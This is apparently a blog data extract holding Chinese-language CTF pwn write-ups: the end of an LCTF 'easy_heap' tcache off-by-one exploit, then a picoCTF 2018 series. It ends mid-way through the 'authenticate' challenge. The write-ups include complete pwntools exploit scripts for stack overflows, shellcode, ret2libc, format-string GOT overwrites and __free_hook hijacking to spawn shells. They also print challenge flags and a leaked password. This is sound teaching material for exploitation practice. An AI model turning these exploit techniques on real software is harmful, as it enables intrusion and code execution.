0xF8 ) exit_(); *(16LL * idxa + chunk_menu + 8) = chunk_size; printf(&quot;content \\n&gt; &quot;); read_input_content(*(16LL * idxa + chunk_menu), *(16LL * idxa + chunk_menu + 8)); } } 我们可以看到可以new的chunk的数量是最多时10个，并且malloc的新chunk位置都是在开头calloc的chunk后面，并且content的输入方式单独写了个函数，我们跟进去看看 void __fastcall read_input_content(_BYTE *input, int chunk_size) { unsigned int i; // [rsp+14h] [rbp-Ch] i = 0; if ( chunk_size ) { while ( 1 ) { read(0, &amp;input[i], 1uLL); if ( chunk_size - 1 &lt; i || !input[i] || input[i] == &#39;\\n&#39; ) break; ++i; } input[i] = 0; input[chunk_size] = 0; #null byte off-by-one } else { *input = 0; } } 我们结合前面的SIZE_MAX = 0xF8和malloc的都是0xF8可以发现，当我们new一个size=0xF8的chunk时他会把input[0xf8]赋值为0，但这就相当于把下一个chunk的size位覆盖了一个字节，我们具体调试一下 #poc new(0x10,&#39;aaaa&#39;) #0 new(0x10,&#39;aaaa&#39;) #1 free(0) new(0xf8,&#39;a&#39;*0xf8) #0 pwndbg&gt; parseheap addr prev size status fd bk 0x558c833fa000 0x0 0x250 Used None None 0x558c833fa250 0x0 0xb0 Used None None 0x558c833fa300 0x0 0x100 Used None None 0x558c833fa400 0x0 0x100 Used None None pwndbg&gt; x/8x 0x558c833fa400 0x558c833fa400: 0x0000000000000000 0x0000000000000101 0x558c833fa410: 0x0000000062626262 0x0000000000000000 0x558c833fa420: 0x0000000000000000 0x0000000000000000 0x558c833fa430: 0x0000000000000000 0x0000000000000000 # new(0xf8,&#39;a&#39;*0xf8) pwndbg&gt; parseheap addr prev size status fd bk 0x558c833fa000 0x0 0x250 Used None None 0x558c833fa250 0x0 0xb0 Used None None 0x558c833fa300 0x0 0x100 Freed 0x61616161616161610x6161616161616161 0x558c833fa400 0x6161616161616161 0x100 Used None None pwndbg&gt; x/8x 0x558c833fa400 0x558c833fa400: 0x6161616161616161 0x0000000000000100 &lt;== null byte overwrite 0x558c833fa410: 0x0000000062626262 0x0000000000000000 0x558c833fa420: 0x0000000000000000 0x0000000000000000 0x558c833fa430: 0x0000000000000000 0x0000000000000000 pwndbg&gt; 我们可以看到chunk1的size位确实被\\x00所覆盖了，也证明确实只要size=0xf8就可以overwrite一字节到下一个chunk的size位 接着我们看下delete和show函数 void delete() { unsigned int idx; // [rsp+4h] [rbp-Ch] printf(&quot;index \\n&gt; &quot;); idx = read_input(); if ( idx &gt; 9 || !*(16LL * idx + chunk_menu) ) exit_(); memset(*(16LL * idx + chunk_menu), 0, *(16LL * idx + chunk_menu + 8)); free(*(16LL * idx + chunk_menu)); *(16LL * idx + chunk_menu + 8) = 0; *(16LL * idx + chunk_menu) = 0LL; } void show() { unsigned int idx; // [rsp+4h] [rbp-Ch] printf(&quot;index \\n&gt; &quot;); idx = read_input(); if ( idx &gt; 9 || !*(16LL * idx + chunk_menu) ) exit_(); puts(*(16LL * idx + chunk_menu)); } 中规中矩，没有什么问题 分析完了在这里卡了很久，后来在调题目给的libc时秉持着瞎猫一般是能碰到死耗子的原则查了下libc的版本，结果还真的找到了是2.27 要考虑tcache，马上切了个环境去调试(在这之前快被各种double free报错搞死了，哭) 我们先布局好7、8、9号堆 new_tcache() new(0x10,&#39;aaaa&#39;) #7 new(0x10,&#39;bbbb&#39;) #8 new(0x10,&#39;cccc&#39;) #9 free_tcache() free(7) free(8) free(9) 然后下面的操作看上去可能会很绕但想明白了就很明了了，我们先把0-6从tcache取出new好7、8、9号堆后再放回tcache后把chunk7释放这时我们再看下chunk7的状态 pwndbg&gt; parseheap addr prev size status fd bk 0x564965142000 0x0 0x250 Used None None 0x564965142250 0x0 0xb0 Used None None 0x564965142300 0x0 0x100 Used None None 0x564965142400 0x0 0x100 Used None None 0x564965142500 0x0 0x100 Used None None 0x564965142600 0x0 0x100 Used None None 0x564965142700 0x0 0x100 Used None None 0x564965142800 0x0 0x100 Used None None 0x564965142900 0x0 0x100 Used None None 0x564965142a00 0x0 0x100 Freed 0x7fa21366eca0 0x7fa21366eca0 0x564965142b00 0x100 0x100 Used None None 0x564965142c00 0x200 0x100 Used None None pwndbg&gt; x/8x 0x564965142a00 0x564965142a00: 0x0000000000000000 0x0000000000000101 0x564965142a10: 0x00007fa21366eca0 0x00007fa21366eca0 0x564965142a20: 0x0000000000000000 0x0000000000000000 0x564965142a30: 0x0000000000000000 0x0000000000000000 pwndbg&gt; 已经把main_arena放入在chunk里了，这时我们再把tcache清空后free8再重新取回来让chunk8_size=0xf8触发null byte off-by-one覆盖chunk9的previnuse位为0，让我们看下chunk现在的情况 pwndbg&gt; parseheap addr prev size status fd bk 0x556bf9a1e000 0x0 0x250 Used None None 0x556bf9a1e250 0x0 0xb0 Used None None 0x556bf9a1e300 0x0 0x100 Used None None 0x556bf9a1e400 0x0 0x100 Used None None 0x556bf9a1e500 0x0 0x100 Used None None 0x556bf9a1e600 0x0 0x100 Used None None 0x556bf9a1e700 0x0 0x100 Used None None 0x556bf9a1e800 0x0 0x100 Used None None 0x556bf9a1e900 0x0 0x100 Used None None 0x556bf9a1ea00 0x0 0x100 Freed 0x7f003ff88ca0 0x7f003ff88ca0 0x556bf9a1eb00 0x100 0x100 Freed 0x746972777265766f 0x392065 0x556bf9a1ec00 0x200 0x100 Used None None pwndbg&gt; x/8x 0x556bf9a1ea00 0x556bf9a1ea00: 0x0000000000000000 0x0000000000000101 0x556bf9a1ea10: 0x00007f003ff88ca0 0x00007f003ff88ca0 0x556bf9a1ea20: 0x0000000000000000 0x0000000000000000 0x556bf9a1ea30: 0x0000000000000000 0x0000000000000000 pwndbg&gt; x/8x 0x556bf9a1eb00 0x556bf9a1eb00: 0x0000000000000100 0x0000000000000100 0x556bf9a1eb10: 0x746972777265766f 0x0000000000392065 0x556bf9a1eb20: 0x0000000000000000 0x0000000000000000 0x556bf9a1eb30: 0x0000000000000000 0x0000000000000000 pwndbg&gt; x/8x 0x556bf9a1ec00 0x556bf9a1ec00: 0x0000000000000200 0x0000000000000100 0x556bf9a1ec10: 0x0000000063636363 0x0000000000000000 0x556bf9a1ec20: 0x0000000000000000 0x0000000000000000 0x556bf9a1ec30: 0x0000000000000000 0x0000000000000000 这时我们可以看到chunk9的pre_size位位0x200chunk9的previnuse位也为0，就可以尝试一波unlink了，先把tcache填满，再free9后，我们再看下chunk pwndbg&gt; parseheap addr prev size status fd bk 0x5624364b4000 0x0 0x250 Used None None 0x5624364b4250 0x0 0xb0 Used None None 0x5624364b4300 0x0 0x100 Used None None 0x5624364b4400 0x0 0x100 Used None None 0x5624364b4500 0x0 0x100 Used None None 0x5624364b4600 0x0 0x100 Used None None 0x5624364b4700 0x0 0x100 Used None None 0x5624364b4800 0x0 0x100 Used None None 0x5624364b4900 0x0 0x100 Used None None 我们接着把tcache清空，新建chunk9和overwrite到chunk8的chunk7，再把chunk6和chunk9释放掉后，这时chunk7里存的就是heap地址了，show(7)便可以泄露heapbase pwndbg&gt; parseheap addr prev size status fd bk 0x55fe2fe46000 0x0 0x250 Used None None 0x55fe2fe46250 0x0 0xb0 Used None None 0x55fe2fe46300 0x0 0x100 Used None None 0x55fe2fe46400 0x0 0x100 Used None None 0x55fe2fe46500 0x0 0x100 Used None None 0x55fe2fe46600 0x0 0x100 Used None None 0x55fe2fe46700 0x0 0x100 Used None None 0x55fe2fe46800 0x0 0x100 Used None None 0x55fe2fe46900 0x0 0x100 Used None None 0x55fe2fe46a00 0x0 0x100 Used None None 0x55fe2fe46b00 0x100 0x100 Used None None pwndbg&gt; x/8x 0x55fe2fe46b00 0x55fe2fe46b00: 0x0000000000000100 0x0000000000000101 0x55fe2fe46b10: 0x000055fe2fe46310 &lt;== 0x0000000000000000 0x55fe2fe46b20: 0x0000000000000000 0x0000000000000000 0x55fe2fe46b30: 0x0000000000000000 0x0000000000000000 之后就是想办法去泄露libc地址了，这步也卡了很久，本来是想通过tcache_dup修改chunk7里的数据改成那个存着libc地址的地址，后来发现真的被自己蠢哭，最后我是把chunk_menu也就是一开始calloc的0xb0的chunk里面chunk7的指针通过tcache_dup改成存着libc地址的chunk再leak出来 pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x565551ed3c00 (size : 0x20400) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x100) tcache_entry[14]:0x565551ed3b10 --&gt; 0x565551ed3b10 (overlap chunk with 0x565551ed3b00(freed) ) pwndbg&gt; parseheap addr prev size status fd bk 0x565551ed3000 0x0 0x250 Used None None 0x565551ed3250 0x0 0xb0 Used None None 0x565551ed3300 0x0 0x100 Used None None 0x565551ed3400 0x0 0x100 Used None None 0x565551ed3500 0x0 0x100 Used None None 0x565551ed3600 0x0 0x100 Used None None 0x565551ed3700 0x0 0x100 Used None None 0x565551ed3800 0x0 0x100 Used None None 0x565551ed3900 0x0 0x100 Used None None 0x565551ed3a00 0x0 0x100 Used None None 0x565551ed3b00 0x100 0x100 Used None None pwndbg&gt; 在泄露出了libc地址后基本就是为所欲为了，重新做个tcache_dup把free_hook修改成one_gadget就直接getshell了，这里贴上exp from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./easy_heap&#39;) #n = remote(&#39;118.25.150.134&#39;,6666) elf = ELF(&#39;./easy_heap&#39;) libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) def new_0(): n.recvuntil(&#39;which command?\\n&gt; &#39;) n.sendline(&quot;1&quot;) n.recvuntil(&#39;&gt; &#39;) n.sendline(&#39;0&#39;) def new(size,content): n.recvuntil(&#39;which command?\\n&gt; &#39;) n.sendline(&quot;1&quot;) n.recvuntil(&#39;size \\n&gt; &#39;) n.sendline(str(size)) n.recvuntil(&#39;content \\n&gt; &#39;) n.sendline(content) def free(idx): n.recvuntil(&#39;which command?\\n&gt; &#39;) n.sendline(&quot;2&quot;) n.recvuntil(&#39;index \\n&gt; &#39;) n.sendline(str(idx)) def show(idx): n.recvuntil(&#39;which command?\\n&gt; &#39;) n.sendline(&quot;3&quot;) n.recvuntil(&#39;index \\n&gt; &#39;) n.sendline(str(idx)) def new_tcache(): for i in range(7): new(0x10,&#39;aaaa&#39;) def free_tcache(): for i in range(0,7): free(i) new_tcache() new(0x10,&#39;aaaa&#39;) #7 new(0x10,&#39;bbbb&#39;) #8 new(0x10,&#39;cccc&#39;) #9 free_tcache() free(7) free(8) free(9) new_tcache() new(0x10,&#39;aaaa&#39;) #7 new(0x10,&#39;bbbb&#39;) #8 new(0x10,&#39;cccc&#39;) #9 free_tcache() free(7) new_tcache() free(8) new(0xf8,&#39;overwrite 9&#39;) free_tcache() free(9) new_tcache() new(0x10,&#39;aaaa&#39;) #9 new(0x10,&#39;bbbb&#39;) #7(8) free(6) free(9) show(7) heap_base = u64(n.recv(6)+&#39;\\x00\\x00&#39;) print hex(heap_base) free(7) new(0xf0,p64(heap_base-64)) #7 new(0xf0,&#39;aaaa&#39;) #7_2 new(0xf0,p64(heap_base+0x700+0x8)) show(7) libc_base = u64(n.recv(6)+&#39;\\x00\\x00&#39;) - 0x3ebca0 print hex(libc_base) free_hook = libc.symbols[&#39;__free_hook&#39;]+libc_base print &quot;free_hook&quot;,hex(free_hook) one_gadget = libc_base + 0x4f322 free(6) free(9) new(0xf0,p64(free_hook)) new(0xf0,&#39;aaaa&#39;) new(0xf0,p64(one_gadget)) n.interactive() 总结这次LCTF学到了不少，感谢丁佬没打死我还告诉我调试得出来puts出来的是里面的值里面不是指针，下次一定要好好学习跟上大哥们的解题速度","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"picoCTFのpwn解析","slug":"picoCTFのpwn解析","date":"2019-11-05T03:50:36.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/picoCTFのpwn解析/","link":"","permalink":"/2019/11/05/picoCTFのpwn解析/","excerpt":"","text":"国庆期间得知了美国CMU主办的picoCTF比赛，出于最近做题的手感有所下降，借此比赛来复习下PWN相关的题型（题目的质量不错，而且题型很广，自我感觉相当棒的比赛） 本文首发于安全客—picoCTFのpwn解析 buffer overflow 0先检查一遍文件 ➜ bufferoverflow0 file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e1e24cdf757acbd04d095e531a40d044abed7e82, not stripped ➜ bufferoverflow0 checksec vuln [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow0/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 由于这题给了源码所以我们直接看源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; #define FLAGSIZE_MAX 64 char flag[FLAGSIZE_MAX]; void sigsegv_handler(int sig) { fprintf(stderr, &quot;%s\\n&quot;, flag); fflush(stderr); exit(1); } void vuln(char *input){ char buf[16]; strcpy(buf, input);// !stackoverflow } int main(int argc, char **argv){ FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(flag,FLAGSIZE_MAX,f); signal(SIGSEGV, sigsegv_handler); gid_t gid = getegid(); setresgid(gid, gid, gid); if (argc &gt; 1) { vuln(argv[1]); printf(&quot;Thanks! Received: %s&quot;, argv[1]); } else printf(&quot;This program takes 1 argument.\\n&quot;); return 0; } 不难看出传入的参数没有限制大小造成在vuln函数里面strcpy至buf时可能导致栈溢出，而这题只要将程序执行流劫持到sigsegv_handler函数就可以读flag，直接放exp EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) elf = ELF(&#39;./vuln&#39;) flag_addr = 0x804a080 puts_plt = elf.plt[&#39;puts&#39;] buf = &#39;a&#39;*0x18 payload = buf + &#39;aaaa&#39; payload += p32(puts_plt) + &#39;aaaa&#39; + p32(flag_addr) n = process(argv=[&#39;./vuln&#39;, payload]) n.interactive() FLAG picoCTF{ov3rfl0ws_ar3nt_that_bad_a54b012c} buffer overflow 1检查一遍文件 ➜ bufferoverflow1 file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=98eac1e5bfaa95437b28e069a343f3c3a7b9e800, not stripped ➜ bufferoverflow1 checksec vuln [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow1/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 全都没开，大胆猜测是要我们写shellcode，看源码确认一波 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &quot;asm.h&quot; #define BUFSIZE 32 #define FLAGSIZE 64 void win() { char buf[FLAGSIZE]; FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(buf,FLAGSIZE,f); printf(buf); } void vuln(){ char buf[BUFSIZE]; gets(buf); printf(&quot;Okay, time to return... Fingers Crossed... Jumping to 0x%x\\n&quot;, get_return_address()); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(&quot;Please enter your string: &quot;); vuln(); return 0; } emmmm……看起来是可以用ret2shellcode但感觉有点麻烦，所以就简单套路直接溢出后劫持返回地址为win函数直接getflag EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./vuln&#39;) elf = ELF(&#39;./vuln&#39;) buf = 0x28 win_addr = 0x080485CB payload = &#39;a&#39;*buf + &#39;aaaa&#39; + p32(win_addr) n.sendline(payload) n.interactive() FLAG picoCTF{addr3ss3s_ar3_3asy14941911} leak-me➜ leak-me file auth auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c69a8024075d10a44fe028c410f5a06580bd3d82, not stripped ➜ leak-me checksec auth [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/leak-me/auth&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 看源码分析一下程序的主要功能 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; int flag() { char flag[48]; FILE *file; file = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if (file == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(flag, sizeof(flag), file); printf(&quot;%s&quot;, flag); return 0; } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid gid_t gid = getegid(); setresgid(gid, gid, gid); // real pw: FILE *file; char password[64]; char name[256]; char password_input[64]; memset(password, 0, sizeof(password)); memset(name, 0, sizeof(name)); memset(password_input, 0, sizeof(password_input)); printf(&quot;What is your name?\\n&quot;); fgets(name, sizeof(name), stdin); char *end = strchr(name, &#39;\\n&#39;); //name=&#39;a&#39;*0x100 *end = NULL if (end != NULL) { *end = &#39;\\x00&#39;; } strcat(name, &quot;,\\nPlease Enter the Password.&quot;); file = fopen(&quot;password.txt&quot;, &quot;r&quot;); if (file == NULL) { printf(&quot;Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(password, sizeof(password), file); printf(&quot;Hello &quot;); puts(name); fgets(password_input, sizeof(password_input), stdin); password_input[sizeof(password_input)] = &#39;\\x00&#39;; if (!strcmp(password_input, password)) { flag(); } else { printf(&quot;Incorrect Password!\\n&quot;); } return 0; } 我们可以看到存在一个很经典的栅栏错误类型的off-by-one漏洞，当name输入为‘a’* 0x100 时栈上的结构会如下图所示 我们知道puts是根据’\\x00’来判断字符串的末端来输出，根据程序逻辑正常的情况下应该是像左图一样是以’\\n’为结尾的字符串，然后通过源代码43—47行来将’\\n’替换成’\\x00’使得puts(name)能正确输出输入的name，但如果输入了’a’* 256的话，会导致最后一个’\\n’并没有读入而导致程序在puts(name)时会连带下面的password一起输出，这样我们就可以得到服务器上的password为 a_reAllY_s3cuRe_p4s$word_f85406 然后直接连服务器，输入长度小于256的name和leak出来的password就能直接拿到flag FLAG picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_0f7ec3c0} shellcode➜ shellcode file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=fdba7cd36e043609da623c330a501f920470b49a, not stripped ➜ shellcode checksec vuln [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/shellcode/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments emmmm……防护机制全没开而且题目还叫shellcode，应该错不了是写shellcode了 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #define BUFSIZE 148 #define FLAGSIZE 128 void vuln(char *buf){ gets(buf); puts(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); char buf[BUFSIZE]; puts(&quot;Enter a string!&quot;); vuln(buf); puts(&quot;Thanks! Executing now...&quot;); ((void (*)())buf)(); return 0; } 简单审计源码后发现还真是只要写个shellcode就没了，直接给exp EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./vuln&#39;) elf = ELF(&#39;./vuln&#39;) payload = asm(shellcraft.sh()) n.sendline(payload) n.interactive() FLAG picoCTF{shellc0de_w00h00_7f5a7309} bufer overflow2➜ bufferoverflow2 file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f2f6cce698b62f5109de9955c0ea0ab832ea967c, not stripped ➜ bufferoverflow2 checksec vuln [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow2/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 审计一下源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #define BUFSIZE 100 #define FLAGSIZE 64 void win(unsigned int arg1, unsigned int arg2) { char buf[FLAGSIZE]; FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;); if (f == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(buf,FLAGSIZE,f); if (arg1 != 0xDEADBEEF) return; if (arg2 != 0xDEADC0DE) return; printf(buf); } void vuln(){ char buf[BUFSIZE]; gets(buf); puts(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(&quot;Please enter your string: &quot;); vuln(); return 0; } 我们很容易理解题目是要我们通过vuln函数里的栈溢出把执行流劫持到win函数，并且要使传入的参数为0xDEADBEEF和0xDEADC0DE，由于是32位程序，所以直接p32(0xDEADBEEF)+p32(0xDEADC0DE)构造ROP来getflag EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./vuln&#39;) elf = ELF(&#39;./vuln&#39;) buf = &#39;a&#39;*0x6c win_addr = 0x80485CB payload = buf + &#39;aaaa&#39; + p32(win_addr)+ &#39;aaaa&#39; + p32(0xDEADBEEF) + p32(0xDEADC0DE) n.sendline(payload) n.interactive() FLAG picoCTF{addr3ss3s_ar3_3asy30833fa1} got-2-learn-libc➜ got-2-learn-libc file vuln vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4e901d4c8bdb0ea8cfd51522376bea63082a2734, not stripped ➜ got-2-learn-libc checksec vuln [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/got-2-learn-libc/vuln&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 开了PIE，然而看到程序觉得开没开都没差的样子 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #define BUFSIZE 148 #define FLAGSIZE 128 char useful_string[16] = &quot;/bin/sh&quot;; /* Maybe this can be used to spawn a shell? */ void vuln(){ char buf[BUFSIZE]; puts(&quot;Enter a string:&quot;); gets(buf); puts(buf); puts(&quot;Thanks! Exiting now...&quot;); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); puts(&quot;Here are some useful addresses:\\n&quot;); printf(&quot;puts: %p\\n&quot;, puts); printf(&quot;fflush %p\\n&quot;, fflush); printf(&quot;read: %p\\n&quot;, read); printf(&quot;write: %p\\n&quot;, write); printf(&quot;useful_string: %p\\n&quot;, useful_string); printf(&quot;\\n&quot;); vuln(); return 0; } 是的，就是一个简单的ret2libc的应用，通过printf出的地址我们可以得到偏移量，然后去计算system的实际地址，然后把useful_string输出的地址，也就是”/bin/sh”当作参数来构造ROP来执行system(‘/bin/sh’) 我们先连上题目环境看下文件链接的libc文件的路径 Ep3ius@pico-2018-shell-2:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ ldd * vuln: linux-gate.so.1 =&gt; (0xf77c5000) libc.so.6 =&gt; /lib32/libc.so.6 (0xf75ff000) /lib/ld-linux.so.2 (0xf77c6000) EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;./vuln&#39;) elf = ELF(&#39;./vuln&#39;) libc = ELF(&#39;/lib32/libc.so.6&#39;) buf = &#39;a&#39;*0x9c system_sym = libc.symbols[&#39;system&#39;] puts_sym = libc.symbols[&#39;puts&#39;] n.recvuntil(&#39;puts: 0x&#39;) puts_addr = int(n.recvuntil(&#39;\\n&#39;),16) print hex(puts_addr) n.recvuntil(&#39;useful_string: &#39;) sh_addr = int(n.recvuntil(&#39;\\n&#39;),16) print hex(sh_addr) system_addr = (puts_addr - puts_sym) + system_sym payload = buf + &#39;aaaa&#39; + p32(system_addr) + &#39;aaaa&#39; + p32(sh_addr) n.sendline(payload) n.interactive() echooo➜ echooo file echo echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a5f76d1d59c0d562ca051cb171db19b5f0bd8fe7, not stripped ➜ echooo checksec echo [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/echooo/echo&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); char buf[64]; char flag[64]; char *flag_ptr = flag; // Set the gid to the effective gid gid_t gid = getegid(); setresgid(gid, gid, gid); memset(buf, 0, sizeof(flag)); memset(buf, 0, sizeof(buf)); puts(&quot;Time to learn about Format Strings!&quot;); puts(&quot;We will evaluate any format string you give us with printf().&quot;); puts(&quot;See if you can get the flag!&quot;); FILE *file = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if (file == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(flag, sizeof(flag), file); while(1) { printf(&quot;&gt; &quot;); fgets(buf, sizeof(buf), stdin); printf(buf); } return 0; } 审计完源码后发现在main函数末尾存在可多次利用的格式化字符串漏洞，而flag已经读入到栈上本来的解题思路应该是通过格式化字符串读栈上flag所在的位置来获得flag，但我的第一想法是直接改printf_got为system的实际地址拿shell 先测出来偏移为11 ➜ echooo ./echo Time to learn about Format Strings! We will evaluate any format string you give us with printf(). See if you can get the flag! &gt; aaaa%11$x aaaa61616161 然后通过p32(printf_got)+”%11$s”泄露出printf的实际地址来计算偏移以此得到system的实际地址 EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) #n = process(&#39;./echo&#39;) n = remote(&#39;2018shell2.picoctf.com&#39;,57169) elf = ELF(&#39;./echo&#39;) libc = ELF(&#39;/lib32/libc.so.6&#39;) #printf_got = elf.got[&#39;printf&#39;] printf_got = 0x804a00c printf_sym = libc.symbols[&#39;printf&#39;] system_sym = libc.symbols[&#39;system&#39;] payload = p32(printf_got)+&#39;%11$s&#39; n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) #leak printf_addr1 = n.recvuntil(&#39;\\n&#39;) printf_addr = u32(printf_addr1[5:9]) print hex(printf_addr) offset = printf_addr - printf_sym system_addr = offset + system_sym print hex(system_addr) payload_fmt = fmtstr_payload(11,{printf_got:system_addr}) n.recvuntil(&#39;&gt;&#39;) n.sendline(payload_fmt) sleep(0.1) n.sendline(&#39;/bin/sh\\0&#39;) n.interactive() FLAG picoCTF{foRm4t_stRinGs_aRe_DanGer0us_e3d226b2} authenticate➜ authenticate file auth auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=36db9dbaf46e8f9c9055839ffedd30fe65050a47, not stripped ➜ authenticate checksec auth [*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/authenticate/auth&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 审计下源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; int authenticated = 0; int flag() { char flag[48]; FILE *file; file = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if (file == NULL) { printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\\n&quot;); exit(0); } fgets(flag, sizeof(flag), file); printf(&quot;%s&quot;, flag); return 0; } void read_flag() { if (!authenticated) { printf(&quot;Sorry, you are not *authenticated*!\\n&quot;); } else { printf(&quot;Access Granted.\\n&quot;); flag(); } } int main(int argc, char **argv) { setvbuf(stdout, NULL, _IONBF, 0); char 